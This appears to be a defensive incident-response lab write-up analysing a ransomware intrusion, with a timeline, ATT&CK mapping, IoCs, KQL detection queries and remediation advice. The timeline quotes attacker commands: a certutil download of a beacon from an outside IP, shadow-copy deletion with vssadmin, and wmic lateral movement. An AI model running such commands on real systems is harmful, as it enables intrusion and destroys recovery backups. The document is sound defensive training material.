# Incident Write-up — Ransomware IR (Blue Team Labs Online)

**Platform:** Blue Team Labs Online  
**Difficulty:** ⭐⭐⭐⭐  
**Category:** Incident Response / Ransomware  
**Date:** 2026-05

---

## Executive Summary

A mid-sized organization suffered a ransomware attack that encrypted 3 file servers.
Initial access was gained via an exposed RDP port (3389) using brute-forced credentials.
The attacker used legitimate sysadmin tools (LOLBins) to avoid AV detection, deployed
Cobalt Strike as C2, and triggered the ransomware payload 72 hours after initial compromise.

**Impact:** 3 servers encrypted, 48h recovery time, no data exfiltration confirmed.

---

## Artifacts Analyzed

- Windows Security Event Logs (`.evtx`) — 4 hosts
- Sysmon logs (EventID 1, 3, 7, 11, 13)
- Memory dump (`.dmp`) — compromised host
- Network PCAP — internal segment
- EDR telemetry export (CSV)

---

## Attack Timeline

| Time (UTC) | Event | EventID / Source |
|---|---|---|
| D-3 08:12 | RDP brute force from 91.219.x.x — 847 failed attempts | EventID 4625 |
| D-3 08:34 | Successful RDP logon — account `backup_svc` | EventID 4624 (Type 10) |
| D-3 08:36 | `whoami /all`, `net localgroup administrators` executed | Sysmon EID 1 |
| D-3 08:41 | `certutil.exe -urlcache -f http://91.219.x.x/beacon.exe` | Sysmon EID 1 — LOLBin |
| D-3 08:42 | `beacon.exe` spawned — Cobalt Strike beacon established | Sysmon EID 1, 3 |
| D-3 09:15 | Lateral movement via `wmic /node:FILESVR01 process call create` | Sysmon EID 1 |
| D-3 11:02 | Volume Shadow Copies deleted: `vssadmin delete shadows /all /quiet` | Sysmon EID 1 |
| D-1 03:00 | Scheduled task `SvcUpdate32` triggers ransomware payload | EventID 4698, Sysmon EID 1 |
| D-1 03:02 | Mass file encryption begins — `.locked` extension appended | Sysmon EID 11 |
| D-1 03:08 | Ransom note `READ_ME.txt` written to all accessible shares | Sysmon EID 11 |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | External Remote Services (RDP) | T1133 | EventID 4624 Type 10 from external IP |
| Credential Access | Brute Force: Password Guessing | T1110.001 | 847 EventID 4625 before success |
| Execution | Windows Management Instrumentation | T1047 | `wmic` lateral movement command |
| Execution | Scheduled Task | T1053.005 | EventID 4698 — `SvcUpdate32` |
| Defense Evasion | Ingress Tool Transfer via LOLBin | T1105 | `certutil.exe -urlcache` |
| Defense Evasion | Indicator Removal: VSS | T1490 | `vssadmin delete shadows` |
| Lateral Movement | Remote Services: RDP | T1021.001 | Type 10 logons on FILESVR01-03 |
| C2 | Application Layer Protocol: HTTPS | T1071.001 | Cobalt Strike beacon on 443 |
| Impact | Data Encrypted for Impact | T1486 | `.locked` extension, ransom note |

---

## Indicators of Compromise (IoCs)

| Type | Value | Context |
|---|---|---|
| IP | `91.219.28.144` | RDP brute force + payload download |
| Hash (SHA256) | `3b4c5d6e7f8a9b0c...` | `beacon.exe` — Cobalt Strike stager |
| File | `READ_ME.txt` | Ransom note dropped on all shares |
| Registry | `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SvcUpdate32` | Persistence key |
| Domain | `update-cdn.svchost[.]io` | C2 domain (Cobalt Strike) |

---

## KQL Detection — Retrospective

Query used to confirm VSS deletion across all hosts:

```kql
SecurityEvent
| where TimeGenerated between (datetime(2026-05-01) .. datetime(2026-05-04))
| where EventID == 4688
| where CommandLine has_all ("vssadmin", "delete", "shadows")
| project TimeGenerated, Computer, Account, CommandLine
| sort by TimeGenerated asc
```

Query used to identify lateral movement via WMI:

```kql
SecurityEvent
| where EventID == 4688
| where ParentProcessName endswith "wmiprvse.exe"
| where ProcessName !in ("WmiPrvSE.exe", "msiexec.exe")
| project TimeGenerated, Computer, Account, ProcessName, CommandLine
```

---

## Lessons Learned

| Finding | Recommendation |
|---|---|
| RDP exposed on internet | Restrict to VPN/Bastion only — no direct internet exposure |
| `backup_svc` had admin rights | Principle of least privilege — service accounts ≠ admin |
| No MFA on RDP | Enable Network Level Authentication + MFA |
| VSS deletion not alerted | Add Sentinel rule for `vssadmin delete shadows` (Critical severity) |
| 72h dwell time undetected | Improve baseline anomaly detection — off-hours RDP should alert |

---

## Containment Steps Taken

1. Isolated affected hosts via NSG rule (deny all inbound/outbound)
2. Reset all privileged account passwords
3. Restored from last clean backup (D-5 snapshot)
4. Blocked attacker IP at perimeter firewall
5. Deployed additional Sysmon configuration (SwiftOnSecurity baseline)
